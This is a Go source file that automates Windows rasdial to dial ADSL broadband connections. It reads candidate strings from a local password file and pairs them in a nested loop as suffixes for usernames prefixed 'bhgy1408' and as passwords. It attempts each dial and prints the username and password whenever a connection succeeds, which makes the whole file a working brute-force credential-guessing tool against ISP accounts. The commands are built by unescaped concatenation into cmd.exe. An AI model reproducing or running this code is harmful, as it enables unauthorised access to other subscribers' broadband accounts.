// adsl project adsl.go
package adsl

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	//"stack"
	//"container/heap"
)

var items =make(map[string]int) 

func executeCmd(command string) error{
	cmd := exec.Command("cmd.exe", "/c", command)
	err := cmd.Run()
	/*if err == nil {
		fmt.Println("成功")
	}else {
		fmt.Println("什么垃圾玩意")
	}*/
	return err
}

func connAdsl(adslTitle string, adslName string, adslPass string) {
	adslCmd := "rasdial " + adslTitle + " " + adslName + " " + adslPass
	err:=executeCmd(adslCmd)
	if err==nil {
		fmt.Println("用户名: " + adslName + "  密码: " + adslPass)
		cutAdsl("宽带连接")
	}else{
		fmt.Println("什么垃圾玩意")
	}

}

func cutAdsl(adslTitle string) {
	cutCmd := "rasdial " + adslTitle + " /disconnect"
	err := executeCmd(cutCmd)
	if err==nil {
		fmt.Println("连接已断开")
	} else {
		fmt.Println(adslTitle + " 连接不存在")
	}

}

// 读取文件的函数调用大多数都需要检查错误，
// 使用下面这个错误检查方法可以方便一点
func check(e error) {
	if e != nil {
		panic(e)
	}
}

func Readfile() {
	userfile := "./allpasswdtest.txt"
	fl, err := os.Open(userfile)
	if err != nil {
		fmt.Println(userfile, err)
	}
	defer fl.Close()
	buf := bufio.NewReader(fl)
	line, _, err := buf.ReadLine()
	
	for i:=0; err == nil; line, _, err = buf.ReadLine() {
		//fmt.Println(string(line))
		initItem(string(line),i)
		i++
	}
	if err == io.EOF {
		fmt.Print(string(line))
	} else {
		panic("read occur error!")
	}

	/*buf := make([]byte, 1024)
	for {
		n, _ := fl.Read(buf)
		if 0 == n {
			break
		}
		fmt.Println(string(buf[:n]))
		Foo(buf[:n])
	}
	*/
}

func main1() {
	connAdsl("宽带", "hzhz**********", "******")
	cutAdsl("宽带")
}

func Cmd(command string) {
	cmd := exec.Command("cmd.exe", "/c", command)
	err := cmd.Run()
	if err == nil {
		fmt.Println("成功")
	}else {
		fmt.Println("什么垃圾玩意")
	}
}

func initItem(line string,i int){
	items[line]=i
}

func Pass(){
	Readfile()
	/*pq:=make(stack.PriorityQueue,len(items))
	i:=0
	for key,priority:=range items{
		pq[i]=&stack.Item{
			Value: key,
			Priority:priority,
			Index: i,
		}
		i++
	}
	heap.Init(&pq)
	*/
	
	for key,_:=range items{
		/*for pq.Len()>0{
			item:=heap.Pop(&pq).(*stack.Item)
			fmt.Printf("%s\t%.2d:%s\n",key,item.Priority,item.Value)
		}*/
		for passwd,_:=range items{
			connAdsl("宽带连接","bhgy1408"+key,passwd)
		}
		
	}
	
}


